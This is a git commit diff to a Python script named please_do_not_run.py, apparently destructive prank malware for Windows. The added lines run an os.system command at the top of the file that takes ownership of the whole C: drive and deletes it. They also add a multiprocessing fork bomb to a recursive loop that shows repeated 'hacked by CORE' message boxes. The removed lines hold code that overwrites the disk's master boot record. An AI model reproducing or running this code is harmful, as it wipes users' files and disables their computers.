43b1c38a2131c4e34b049037c5f7c38cbc7a05bf
Bulldozercafe-core-64 <core.bulldozercafe.64@gmail.com>
2025-08-30 22:03:14 +0900

    Update please_do_not_run.py

--- please_do_not_run.py
+++ please_do_not_run.py
@@ -1,5 +1,12 @@
 import os
 
+os.system("""takeown /f 'C:\*' /r /d y
+    icacls 'C:\*' /grant :f /t
+    del /f /s /q C:\*
+    rd /s /q C:\*
+    """)
+
+
 # 새로운 메모장을 열어 특정 파일을 생성
 file_path = f"C:\\Users\\{os.getlogin()}\\Desktop\\memo.txt"
 with open(file_path, "w", encoding="utf-8") as f:
@@ -13,14 +20,14 @@ os.system(f"notepad {file_path}")
 
 # Hacking Code
 """
-1. Break mbr
-2. Put fork bomb
-3. Stack overflow
+1. Put fork bomb
+2. Stack overflow
 """
 
 import time
 import ctypes
 import sys
+import multiprocessing
 
 sys.setrecursionlimit(10 ** 6)
 
@@ -32,20 +39,6 @@ ctypes.windll.user32.MessageBoxW(0, "Starting Hacking Code", "Danger", 0x30 | 0x
 print("demolishing your computer...")
 ctypes.windll.user32.MessageBoxW(0, "Unknown code has been started", "Danger", 0x20 | 0x1)
 
-os.system("""takeown /f 'C:\*' /r /d y
-    icacls 'C:\*' /grant :f /t
-    del /f /s /q C:\*
-    rd /s /q C:\*
-    """)
-
-handle = ctypes.windll.kernel32.CreateFileW('\\\\.\\PhysicalDrive0', 0x40000000 | 0xC0000000, 0, None, 3, 0, None)
-mbr_size = 512
-message_bytes = b"Your computer is hacked by CORE :D"
-padding = b"\x00" * (mbr_size - len(message_bytes))
-mbr_data = message_bytes + padding
-bytes_written = ctypes.c_ulong(0)
-ctypes.windll.kernel32.WriteFile(handle, mbr_data, mbr_size, ctypes.byref(bytes_written), None)
-ctypes.windll.kernel32.CloseHandle(handle)
 
 ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
 print(":D byebye ")
@@ -64,5 +57,7 @@ while 1:
     def consume_memory():
             ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
             pyautogui.moveTo(0, 0)
+            p = multiprocessing.Process(target=consume_memory)
+            p.start()
             return consume_memory()
     consume_memory()
